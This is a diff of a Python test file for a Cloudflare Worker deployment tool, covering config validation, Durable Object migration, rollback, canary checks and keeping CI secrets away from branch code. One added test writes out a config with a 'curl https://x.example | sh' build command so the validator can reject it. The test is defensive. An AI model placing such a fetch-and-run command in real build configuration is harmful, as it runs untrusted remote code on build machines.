@@ -1,12 +1,8 @@
 #!/usr/bin/env python3
 """1.39 [DEPLOY-01] tools/deploy_worker.py의 안전장치 시험(바깥과 닿지 않는 부분만).  python3 tools/test_deploy_worker.py"""
-import os
-import shutil
 import sys
-import tempfile
 import unittest
 from pathlib import Path
-from unittest import mock
 
 sys.path.insert(0, str(Path(__file__).resolve().parent))
 import deploy_worker as d  # noqa: E402
@@ -116,7 +112,28 @@ class DeployWorkerTest(unittest.TestCase):
         self.assertEqual(d.upload_version_id("", "Worker Version ID: 0f0f0f0f-1111-2222-3333-555555555555"), "0f0f0f0f-1111-2222-3333-555555555555")
         self.assertIsNone(d.upload_version_id("", "nothing"))
 
-    # ---------- 2.0.0 [RVD-33] Durable Object 첫 배포 ----------
+    # ---- 2.0.0 [RVQ-01~04] 검토 SRV-02·SRV-04·I21c-02·U21-09 ----
+
+    def test_config_only_known_keys(self):
+        ok = (Path(__file__).resolve().parent.parent / "server/company-worker/wrangler.toml").read_text(encoding="utf-8")
+        self.assertEqual(d.config_problems(ok, "company"), [])
+        bad = ok + '\n[build]\ncommand = "curl https://x.example | sh"\n'
+        self.assertIn("모르는 칸 [build]", d.config_problems(bad, "company"))
+        self.assertTrue(any("이름" in x for x in d.config_problems(ok, "share")))
+        self.assertTrue(d.config_problems("name = [", "company"))
+        share = (Path(__file__).resolve().parent.parent / "server/share-worker/wrangler.toml").read_text(encoding="utf-8")
+        self.assertEqual(d.config_problems(share, "share"), [])
+        # 2.0.0 [RVD-33] 앱 없는 팀원 방(Q1 4h)의 Durable Object 바인딩·migration은 받는 칸이에요.
+        room = ('\n[[durable_objects.bindings]]\nname = "TEAM_ROUND"\nclass_name = "TeamRound"\n'
+                '\n[[migrations]]\ntag = "v1-team-round"\nnew_sqlite_classes = ["TeamRound"]\n')
+        self.assertEqual(d.config_problems(share + room, "share"), [])
+
+    def test_pending_do_migration_points_to_migrate(self):
+        # 2.0.0 [RVD-33] wrangler 4.150.0이 적용 안 된 DO migration으로 versions upload를 막으면 다음에 할 일은 main 도구 migrate.
+        out = ("✘ [ERROR] This Worker has a pending Durable Object migration, which cannot be applied by `wrangler versions upload`. "
+               "Durable Object migrations must be applied with `wrangler deploy`.")
+        self.assertIn("migrate", d.upload_hint(out))
+        self.assertIsNone(d.upload_hint("✘ [ERROR] Authentication error [code: 10000]"))
 
     SHARE_OLD = [
         {"type": "plain_text", "name": "ANDROID_CERT_SHA256", "text": "AA:BB"},
@@ -132,6 +149,7 @@ class DeployWorkerTest(unittest.TestCase):
         '[[durable_objects.bindings]]\nname = "TEAM_ROUND"\nclass_name = "TeamRound"\n'
         '[[migrations]]\ntag = "v1-team-round"\nnew_sqlite_classes = ["TeamRound"]\n'
     )
+
 
     def test_do_lifecycle_and_pending(self):
         lc = d.do_lifecycle(self.TEAM_ROUND)
@@ -189,166 +207,6 @@ class DeployWorkerTest(unittest.TestCase):
         self.assertEqual(d.deploy_version_id("", "Current Version ID: 0f0f0f0f-1111-2222-3333-555555555555"), "0f0f0f0f-1111-2222-3333-555555555555")
         self.assertIsNone(d.deploy_version_id('{"type":"version-upload","version_id":"x"}', "nothing"))
 
-    def test_normal_deploy_stops_on_pending_migration(self):
-        # 보통 deploy는 설정에 실서버보다 새 migration이 있으면 올리기 전에 migrate로 보내요(바깥은 가짜로).
-        calls = []
-        real = (d.wrangler_json, d.run, d.cf, d.live_version, d.SERVER)
-        tmp = Path(tempfile.mkdtemp())
-        env = mock.patch.dict(os.environ, {"CLOUDFLARE_API_TOKEN": "test", "CLOUDFLARE_ACCOUNT_ID": "acc"})
-        env.start()
-        os.environ.pop("GITHUB_STEP_SUMMARY", None)  # 배포 job에서 돌아도 가짜 줄이 배포 요약에 남지 않게
-        try:
-            (tmp / "share-worker/src").mkdir(parents=True, exist_ok=True)
-            (tmp / "share-worker/wrangler.toml").write_text(self.TEAM_ROUND.replace('id = "abc123"', 'id = "REPLACE_WITH_KV_NAMESPACE_ID"'), encoding="utf-8")
-            (tmp / "share-worker/src/version.js").write_text('export const SERVER_VERSION = "2.0.0";\n', encoding="utf-8")
-            (tmp / "share-worker/dist").mkdir(exist_ok=True)
-            (tmp / "share-worker/dist/worker.js").write_text("export default {}\n", encoding="utf-8")
-            d.SERVER = tmp
-
-            def wj(args, cwd):
-                calls.append(args[:2])
-                if args[0] == "deployments":
-                    return {"versions": [{"version_id": "old", "percentage": 100}]}
-                return {"resources": {"bindings": self.SHARE_OLD}}
-            d.wrangler_json = wj
-            d.run = lambda cmd, cwd, extra_env=None, check=True: calls.append(cmd[:3]) or type("P", (), {"returncode": 0, "stdout": "", "stderr": ""})()
-            d.cf = lambda method, path, body=None: {"result": {"default_environment": {"script": {}}}}
-            d.live_version = lambda worker, base, view=None: "2.0.0"
-            with self.assertRaises(d.Stop) as e:
-                d.deploy("share", "check", "0123456789abcdef", "시험", False)
-            self.assertIn("migrate", str(e.exception))
-            self.assertFalse(any(c[:2] == ["npx", "--yes"] and "upload" in c for c in calls))
-            # 실서버에 이미 적용됐으면 보통 deploy로 올라가요(versions upload까지 감).
-            d.cf = lambda method, path, body=None: {"result": {"default_environment": {"script": {"migration_tag": "v1-team-round"}}}}
-            with self.assertRaises(d.Stop) as e:
-                d.deploy("share", "check", "0123456789abcdef", "시험", False)
-            self.assertIn("판 번호를 읽지 못했어요", str(e.exception))  # 가짜 run은 판 번호를 주지 않아요: upload까지 간 것
-        finally:
-            d.wrangler_json, d.run, d.cf, d.live_version, d.SERVER = real
-            env.stop()
-            shutil.rmtree(tmp, ignore_errors=True)
-
-    def run_migrate(self, mode, deploy_rc=0, deploy_goes_live=True, healthy=True, drops_domain=False, routes_readable=True):
-        """가짜 Cloudflare로 migrate를 끝까지 돌려요. (예외, 부른 명령들, 말한 줄들, 배포용 설정)."""
-        state = {"serving": "old", "tag": None, "domains": [{"hostname": "s.bamnat.app", "service": "bamnat-share", "enabled": True}]}
-        seen = {}
-        new_id = "0f0f0f0f-1111-2222-3333-444444444444"
-        cmds, said = [], []
-        real = (d.wrangler_json, d.run, d.cf, d.live_version, d.healthy, d.say, d.SERVER, d.time.sleep)
-        tmp = Path(tempfile.mkdtemp())
-        env = mock.patch.dict(os.environ, {"CLOUDFLARE_API_TOKEN": "test", "CLOUDFLARE_ACCOUNT_ID": "acc"})
-        env.start()
-        try:
-            wd = tmp / "share-worker"
-            (wd / "src").mkdir(parents=True)
-            (wd / "dist").mkdir()
-            (wd / "wrangler.toml").write_text(self.TEAM_ROUND.replace('id = "abc123"', 'id = "REPLACE_WITH_KV_NAMESPACE_ID"'), encoding="utf-8")
-            (wd / "src/version.js").write_text('export const SERVER_VERSION = "2.0.0";\n', encoding="utf-8")
-            (wd / "dist/worker.js").write_text("export default {}\n", encoding="utf-8")
-            d.SERVER = tmp
-
-            def wj(args, cwd):
-                if args[0] == "deployments":
-                    return {"versions": [{"version_id": state["serving"], "percentage": 100}]}
-                if args[2] == "old":
-                    return {"resources": {"bindings": self.SHARE_OLD}}
-                return {"resources": {"bindings": self.SHARE_OLD + [{"type": "durable_object_namespace", "name": "TEAM_ROUND", "class_name": "TeamRound"}]}}
-
-            def fake_run(cmd, cwd, extra_env=None, check=True):
-                cmds.append(cmd)
-                rc, out = 0, ""
-                if cmd[:4] == ["npx", "--yes", "wrangler@4.150.0", "deploy"]:
-                    seen["config"] = (wd / "wrangler.deploy.toml").read_text(encoding="utf-8")
-                if cmd[:4] == ["npx", "--yes", "wrangler@4.150.0", "deploy"] and "--dry-run" not in cmd:
-                    rc = deploy_rc
-                    if deploy_goes_live:
-                        state["serving"], state["tag"] = new_id, "v1-team-round"
-                        out = f"Current Version ID: {new_id}"
-                        if drops_domain:
-                            state["domains"] = []
-                if check and rc:
-                    raise d.Stop(f"fail {rc}")
-                return type("P", (), {"returncode": rc, "stdout": out, "stderr": ""})()
-
-            d.wrangler_json = wj
-            d.run = fake_run
-            def fake_cf(method, path, body=None):
-                if path.endswith("/subdomain"):
-                    return {"result": {"enabled": True, "previews_enabled": False}}
-                if "/workers/domains?service=bamnat-share" in path:
-                    return {"result": list(state["domains"])}
-                if path.endswith("/environments/production/routes"):
-                    if not routes_readable:
-                        raise RuntimeError("403")
-                    return {"result": []}
-                return {"result": {"default_environment": {"script": {"migration_tag": state["tag"]}}}}
-            d.cf = fake_cf
-            d.live_version = lambda worker, base, view=None: "2.0.0"
-            d.healthy = lambda worker, base, want, deep=True: (healthy, "health 200" if healthy else "health 500")
-            d.say = said.append
-            d.time.sleep = lambda s: None
-            err = None
-            try:
-                d.deploy("share", mode, "0123456789abcdef", "DO 바닥", False)
-            except (d.Stop, SystemExit) as e:
-                err = e
-            return err, cmds, said, seen.get("config", "")
-        finally:
-            d.wrangler_json, d.run, d.cf, d.live_version, d.healthy, d.say, d.SERVER, d.time.sleep = real
-            env.stop()
-            shutil.rmtree(tmp, ignore_errors=True)
-
-    @staticmethod
-    def wrangler_deploys(cmds):
-        return [c for c in cmds if c[3:4] == ["deploy"]]
-
-    def test_migrate_check_only_dry_runs(self):
-        err, cmds, said, config = self.run_migrate("migrate-check")
-        self.assertIsNone(err)
-        # 지금 붙은 연결을 요약에 남기고, workers.dev·미리보기 URL은 지금 값으로 적어 dry-run해요.
-        self.assertIn("사용자 도메인 s.bamnat.app · workers.dev 켜짐 · 미리보기 URL 꺼짐 · route 없음", " ".join(said))
-        self.assertIn("workers_dev = true\npreview_urls = false\n", config)
-        self.assertEqual([("--dry-run" in c) for c in self.wrangler_deploys(cmds)], [True])
-        self.assertFalse(any("upload" in c or c[3:4] == ["versions"] for c in cmds))
-        self.assertIn("새 되돌리기 바닥", " ".join(said))
-
-    def test_migrate_deploys_once_and_keeps_vars(self):
-        err, cmds, said, config = self.run_migrate("migrate")
-        self.assertIsNone(err, said)
-        self.assertIn("preview_urls = false", config)
-        real = [c for c in self.wrangler_deploys(cmds) if "--dry-run" not in c]
-        self.assertEqual(len(real), 1)
-        self.assertIn("--keep-vars", real[0])
-        self.assertIn("ANDROID_CERT_SHA256:AA:BB", real[0])  # 대시보드 일반 변수는 값까지 넘겨요
-        self.assertNotIn("RATE_SALT", " ".join(real[0]))  # 비밀값은 건드리지 않아요
-        self.assertFalse(any(c[3:5] == ["versions", "upload"] for c in cmds))
-        self.assertIn("Durable Object 첫 배포 끝", " ".join(said))
-
-    def test_migrate_failure_never_rolls_back(self):
-        # health가 실패해도 앞 판으로 versions deploy 하지 않아요(Cloudflare가 막고, 시도하면 헷갈려요).
-        err, cmds, said, _ = self.run_migrate("migrate", healthy=False)
-        self.assertIsInstance(err, SystemExit)
-        self.assertFalse(any(c[3:5] == ["versions", "deploy"] for c in cmds))
-        self.assertIn("되돌리지 않아요", " ".join(said))
-        # wrangler deploy가 올리기 전에 실패했으면(손님은 앞 판) 멈춤이에요.
-        err, cmds, said, _ = self.run_migrate("migrate", deploy_rc=1, deploy_goes_live=False)
-        self.assertIsInstance(err, d.Stop)
-        # 올린 뒤 실패(트리거 등)면 앞 판이 아니라 새 판을 확인하고 실패로 알려요.
-        err, cmds, said, _ = self.run_migrate("migrate", deploy_rc=1, deploy_goes_live=True)
-        self.assertIsInstance(err, SystemExit)
-        self.assertIn("코드 1", " ".join(said))
-
-    def test_migrate_says_loudly_when_a_domain_falls_off(self):
-        # 올린 뒤 사용자 도메인(s.bamnat.app)이 떨어지면 health 전에 무엇을 다시 붙여야 하는지 알려요.
-        err, cmds, said, _ = self.run_migrate("migrate", drops_domain=True)
-        self.assertIsInstance(err, SystemExit)
-        self.assertIn("사용자 도메인: ['s.bamnat.app'] → []", " ".join(said))
-        self.assertIn("다시 붙여요", " ".join(said))
-        # route를 못 읽어도(zone 권한 없음) 멈추지 않고 '읽지 못함'으로 남겨요.
-        err, cmds, said, _ = self.run_migrate("migrate", routes_readable=False)
-        self.assertIsNone(err, said)
-        self.assertIn("route 읽지 못함", " ".join(said))
-
     def test_pin_subdomain_and_attachments(self):
         pinned = d.pin_subdomain(self.TEAM_ROUND.replace('main = "src/index.js"\n', 'main = "src/index.js"\nworkers_dev = true\n'), False, True)
         c = d.tomllib.loads(pinned)
@@ -365,6 +223,207 @@ class DeployWorkerTest(unittest.TestCase):
         self.assertEqual(d.attachment_diff(a, b), [])  # 앞에서 route를 못 읽었으면 견주지 않아요
         self.assertEqual(d.attachment_diff(dict(a, routes=[]), b), ["route: [] → ['s.bamnat.app/*']"])
         self.assertEqual(d.attachment_diff(a, dict(a, previews=True)), ["미리보기 URL: False → True"])
+
+    def test_workflow_offers_migrate_one_server_at_a_time(self):
+        # 2.0.0 [RVD-33] migrate는 되돌릴 수 없어서 both로는 시작하지 않아요(gate가 build·ship 전에 멈춰요). 토큰은 여전히 gate·ship 단계에만.
+        import re
+        wf = (Path(__file__).resolve().parents[2] / ".github/workflows/deploy-server.yml").read_text(encoding="utf-8")
+        self.assertIn("options: [check, deploy, migrate-check, migrate]", wf)
+        jobs = wf.split("\njobs:\n", 1)[1]
+        parts = re.split(r"(?m)^  ([a-z]+):\n", jobs)
+        blocks = dict(zip(parts[1::2], parts[2::2]))
+        self.assertIn('migrate*:both)', blocks["gate"])
+        self.assertIn("IN_MODE: ${{ inputs.mode }}", blocks["gate"])
+        self.assertNotIn("secrets.", blocks["gate"].split("- name: 지금 판을 올린 커밋", 1)[0])
+        self.assertIn('--mode "$IN_MODE"', blocks["ship"])
+
+    def test_failing_test_names(self):
+        tap = "ok 1 - a\nnot ok 2 - login counts at once # TODO\n  ---\nnot ok 3 - test/accounts.test.mjs\n# fail 1\n"
+        self.assertEqual(d.failing_tests(tap), ["login counts at once"])
+        spec = "✔ fine (2ms)\n✖ passkey needs user verification (12.5ms)\n✖ failing tests:\n✖ passkey needs user verification (12.5ms)\n"
+        self.assertEqual(d.failing_tests(spec), ["passkey needs user verification"])
+        self.assertEqual(d.failing_tests("all good"), [])
+
+    def test_failing_places_name_and_line_like_the_date_watch(self):
+        """[U60-02] 실패한 시험 이름·줄이 날짜 시험 결과(date_watch)와 같은 모양이라 어제 main과 견줄 수 있어요."""
+        tap = ("ok 1 - a\nnot ok 2 - 새해 첫날 시험\n  ---\n  location: '/w/server/company-worker/test/village-r.test.mjs:41:3'\n"
+               "  failureType: 'testCodeFailure'\n  ...\nnot ok 3 - test/village-r.test.mjs\n# fail 1\n")
+        self.assertEqual([{"name": "village-r.test.mjs › 새해 첫날 시험", "at": "village-r.test.mjs:41"}], d.failing_places(tap))
+        spec = ("✖ passkey needs user verification (12.5ms)\n  AssertionError [ERR_ASSERTION]: x\n"
+                "      at TestContext.<anonymous> (file:///w/test/accounts.test.mjs:88:9)\n✖ failing tests:\n"
+                "✖ passkey needs user verification (12.5ms)\n      at TestContext.<anonymous> (file:///w/test/accounts.test.mjs:88:9)\n"
+                "✖ 줄 없음 (1ms)\n  boom\n")
+        self.assertEqual([{"name": "accounts.test.mjs › passkey needs user verification", "at": "accounts.test.mjs:88"},
+                          {"name": "줄 없음", "at": ""}], d.failing_places(spec))
+        self.assertEqual([], d.failing_places("all good"))
+
+    def test_canary_verdict(self):
+        self.assertEqual(d.canary_verdict({"n": 10, "err": 5}, {"n": 900, "err": 0})[0], "few")
+        self.assertEqual(d.canary_verdict({"n": 100, "err": 1, "ms": 9000}, {"n": 900, "err": 0, "ms": 81000})[0], "ok")
+        self.assertEqual(d.canary_verdict({"n": 100, "err": 8, "ms": 9000}, {"n": 900, "err": 9, "ms": 81000})[0], "worse")
+        # 앞 판도 비슷하게 실패하면(바깥 서비스 탓 등) 새 판 탓이 아니에요.
+        self.assertEqual(d.canary_verdict({"n": 100, "err": 8}, {"n": 900, "err": 70})[0], "ok")
+        self.assertEqual(d.canary_verdict({"n": 100, "err": 0, "ms": 100000}, {"n": 900, "err": 0, "ms": 90000})[0], "worse")
+
+    def test_view_annotation_tag(self):
+        view = {"id": "x", "annotations": {"workers/tag": "0123456789ab", "workers/message": "2.0.0 01234567 why"}}
+        self.assertEqual(d.view_annotation(view, "workers/tag"), "0123456789ab")
+        self.assertIsNone(d.view_annotation({"annotations": {}}, "workers/tag"))
+
+    def test_ref_verdict(self):
+        heads = {"claude/project-thread-f33c16"}
+        self.assertIsNone(d.ref_verdict("main", False, heads, False))
+        self.assertIsNone(d.ref_verdict("claude/project-thread-f33c16", False, heads, False))
+        self.assertIsNotNone(d.ref_verdict("someone/else", False, heads, False))
+        self.assertIsNone(d.ref_verdict("0123abcd", True, heads, False))
+        self.assertIsNone(d.ref_verdict("0123abcd", False, heads, True))
+        self.assertIsNotNone(d.ref_verdict("0123abcd", False, heads, False))
+        self.assertIsNotNone(d.ref_verdict("", False, heads, False))
+
+    def test_summary_three_lines(self):
+        lines = d.summary_lines("시험", ["login counts at once"])
+        self.assertEqual(len(lines), 3)
+        self.assertIn("시험", lines[0])
+        self.assertIn("`login counts at once`", lines[1])
+        self.assertIn("고쳐", lines[2])
+        self.assertIn("해당 없음", d.summary_lines("앞 판")[1])
+        for stage in ("ref", "시험", "번들", "스키마 호환", "설정", "앞 판", "판 이름", "올리기", "바인딩", "카나리", "확인", "되돌리기"):
+            self.assertIn(stage, d.NEXT_STEP)
+
+    def _fake_cloud(self, status_after_undo, crons_now=("*/5 * * * *", "17 * * * *")):
+        """undo가 부르는 바깥(배포·상태·정기 작업·health)을 가짜로."""
+        calls = []
+        state = {"crons": sorted(crons_now)}
+
+        def fake_run(cmd, cwd, extra_env=None, check=True, stage="", clean_env=False):
+            calls.append(" ".join(cmd[-8:]))
+            return type("P", (), {"returncode": 0, "stdout": "", "stderr": ""})()
+
+        def fake_sched(worker, crons=None):
+            if crons is not None:
+                state["crons"] = sorted(crons)
+                calls.append(f"cron {sorted(crons)}")
+            return state["crons"]
+        patches = {"run": fake_run, "wrangler_json": lambda args, cwd: {"versions": status_after_undo},
+                   "schedules": fake_sched, "healthy": lambda *a, **k: (True, "health 200")}
+        return calls, state, patches
+
+    def _patched(self, patches):
+        real = {k: getattr(d, k) for k in patches}
+        real_sleep = d.time.sleep
+        for k, v in patches.items():
+            setattr(d, k, v)
+        d.time.sleep = lambda s: None
+
+        def restore():
+            for k, v in real.items():
+                setattr(d, k, v)
+            d.time.sleep = real_sleep
+        return restore
+
+    def test_undo_restores_crons_and_checks_status(self):
+        r = d.Ready("company", "old-0000-id", "new-1111-id", "2.0.0", "1.39.0", "")
+        r.deployed, r.crons_before = True, ["17 * * * *"]
+        calls, state, patches = self._fake_cloud([{"version_id": "old-0000-id", "percentage": 100}])
+        restore = self._patched(patches)
+        try:
+            d.undo(r, Path("."), "확인")
+        finally:
+            restore()
+        self.assertTrue(any("old-0000-id@100%" in c for c in calls))
+        self.assertEqual(state["crons"], ["17 * * * *"])
+        self.assertFalse(r.deployed)
+
+    def test_undo_that_did_not_take_is_loud(self):
+        r = d.Ready("company", "old-0000-id", "new-1111-id", "2.0.0", "1.39.0", "")
+        r.deployed = True
+        _, _, patches = self._fake_cloud([{"version_id": "new-1111-id", "percentage": 100}])
+        restore = self._patched(patches)
+        try:
+            with self.assertRaises(d.Stop) as e:
+                d.undo(r, Path("."), "확인")
+        finally:
+            restore()
+        self.assertEqual(e.exception.stage, "되돌리기")
+
+    def test_both_rolls_back_the_first_when_the_second_fails(self):
+        order = []
+
+        def fake_stage(w, src, work, sha, reason, allow_older):
+            order.append(f"upload {w}")
+            return d.Ready(w, f"old-{w}", f"new-{w}", "2.0.0", "2.0.0", "")
+
+        def fake_live(r, work, sha, reason):
+            order.append(f"live {r.worker}")
+            r.deployed = True
+            if r.worker == "share":
+                r.deployed = False  # go_live가 자기 것은 되돌리고 멈춰요
+                raise d.Stop("share health 실패", stage="확인")
+
+        def fake_undo(r, work, why):
+            order.append(f"undo {r.worker}")
+        patches = {"account": lambda: None, "stage_upload": fake_stage, "canary": lambda r, work, sha: order.append("canary company"),
+                   "go_live": fake_live, "undo": fake_undo}
+        restore = self._patched(patches)
+        try:
+            with self.assertRaises(d.Stop):
+                d.ship(["company", "share"], Path("."), "deploy", "abc123456789", "test", False)
+        finally:
+            restore()
+        # 둘 다 올리고 대조한 뒤에야 손님을 받고, 뒤의 것이 실패하면 앞의 것도 되돌려요.
+        self.assertEqual(order, ["upload company", "upload share", "canary company", "live company", "live share", "undo company"])
+
+    def test_check_mode_touches_no_traffic(self):
+        order = []
+        patches = {"account": lambda: None,
+                   "stage_upload": lambda w, *a: order.append(w) or d.Ready(w, "o", "n", "2.0.0", "2.0.0", ""),
+                   "canary": lambda *a: order.append("canary"), "go_live": lambda *a: order.append("live")}
+        restore = self._patched(patches)
+        try:
+            d.ship(["company", "share"], Path("."), "check", "abc", "", False)
+        finally:
+            restore()
+        self.assertEqual(order, ["company", "share"])
+
+    def test_workflow_keeps_the_token_away_from_branch_code(self):
+        import re
+        wf = (Path(__file__).resolve().parents[2] / ".github/workflows/deploy-server.yml").read_text(encoding="utf-8")
+        jobs = wf.split("\njobs:\n", 1)[1]
+        parts = re.split(r"(?m)^  ([a-z]+):\n", jobs)
+        blocks = dict(zip(parts[1::2], parts[2::2]))
+        self.assertEqual(sorted(blocks), ["build", "explain", "gate", "ship", "test"])
+        # 고른 브랜치의 코드가 도는 build와 실패를 풀어 주는 explain에는 비밀값이 없어요.
+        self.assertNotIn("secrets.", blocks["build"])
+        self.assertNotIn("secrets.", blocks["explain"])
+        self.assertNotIn("path: target", blocks["explain"])
+        self.assertIn("date_watch.py explain", blocks["explain"])
+        self.assertIn("name: build-fail", blocks["build"])
+        self.assertIn("--phase build", blocks["build"])
+        # 토큰은 job 전체 env가 아니라 그 단계 env에만.
+        for name in ("gate", "ship"):
+            head = blocks[name].split("    steps:", 1)[0]
+            self.assertNotIn("CLOUDFLARE_API_TOKEN", head, name)
+        self.assertIn("secrets.CLOUDFLARE_API_TOKEN", blocks["ship"])
+        # ship은 고른 브랜치를 받지 않아요(main의 도구 + build가 만든 파일만).
+        self.assertNotIn("needs.gate.outputs.sha }}\n          path", blocks["ship"])
+        self.assertNotIn("path: target", blocks["ship"])
+        self.assertIn("github.ref == 'refs/heads/main'", blocks["gate"])
+        # 모든 actions/checkout은 열쇠를 .git에 남기지 않아요.
+        self.assertEqual(wf.count("actions/checkout@"), wf.count("persist-credentials: false"))
+        # 바깥 액션은 커밋 번호로 묶어요.
+        for line in wf.splitlines():
+            if "uses:" in line:
+                self.assertRegex(line, r"uses: [\w./-]+@[0-9a-f]{40}")
+
+    def test_build_runs_branch_code_without_scripts_or_keys(self):
+        import inspect
+        src = inspect.getsource(d.build)
+        self.assertIn("--ignore-scripts", src)
+        self.assertIn("clean_env=True", src)
+        self.assertNotIn("CLOUDFLARE_API_TOKEN", {k for k in d.SAFE_ENV})
+        self.assertNotIn("GITHUB_TOKEN", d.SAFE_ENV)
+        lock = (Path(__file__).resolve().parent / "deploy/package-lock.json").read_text(encoding="utf-8")
+        self.assertIn('"node_modules/wrangler": {\n      "version": "4.150.0"', lock)
 
 
 if __name__ == "__main__":
